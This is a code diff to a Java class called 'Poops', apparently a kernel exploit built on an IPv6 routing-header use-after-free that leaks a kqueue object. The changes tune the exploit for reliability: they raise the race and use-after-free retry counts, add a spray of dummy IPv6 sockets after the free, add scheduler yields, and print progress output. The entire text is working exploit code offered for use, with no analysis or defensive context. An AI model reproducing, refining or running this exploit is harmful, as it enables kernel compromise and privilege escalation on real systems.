@@ -20,10 +20,10 @@ public class Poops {
     private static final int MSG_IOV_NUM = 0x17;
     private static final int IOV_SIZE = 0x10;
 
-    private static final int IPV6_SOCK_NUM = 128;
-    private static final int TWIN_TRIES = 15000;
-    private static final int UAF_TRIES = 50000;
-    private static final int KQUEUE_TRIES = 300000;
+    private static final int IPV6_SOCK_NUM = 192;
+    private static final int TWIN_TRIES = 30000;
+    private static final int UAF_TRIES = 100000;
+    private static final int KQUEUE_TRIES = 500000;
     private static final int IOV_THREAD_NUM = 4;
     private static final int UIO_THREAD_NUM = 4;
     private static final int PIPEBUF_SIZE = 0x18;
@@ -641,15 +641,45 @@ public class Poops {
             // Free one.
             freeRthdr(ipv6Socks[triplets[1]]);
 
+            int[] dummySocks = new int[32];
+            for (int i = 0; i < dummySocks.length; i++) {
+                dummySocks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+            }
+            for (int i = 0; i < dummySocks.length; i++) {
+                close(dummySocks[i]);
+            }
+            
+            for (int i = 0; i < 10; i++) {
+                sched_yield();
+            }
+
             // Leak kqueue.
             int kq = 0;
+            int originalTimeout = timeout;
+            int progressInterval = timeout / 10;
+            int attempt = 0;
             while (timeout-- != 0) {
+                attempt++;
+                
+                if (progressInterval > 0 && attempt % progressInterval == 0) {
+                    console.println("kqueue realloc: " + (attempt / progressInterval) + "0%");
+                }
+                
+                if (attempt % 1000 == 0) {
+                    for (int i = 0; i < 5; i++) {
+                        sched_yield();
+                    }
+                }
+                
+                sched_yield();
+                
                 kq = kqueue();
 
                 // Leak with other rthdr.
                 leakRthdrLen.set(0x100);
                 getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
                 if (leakRthdr.getLong(0x08) == 0x1430000 && leakRthdr.getLong(0x98) != 0) {
+                    console.println("kqueue success at attempt " + attempt);
                     break;
                 }
                 close(kq);
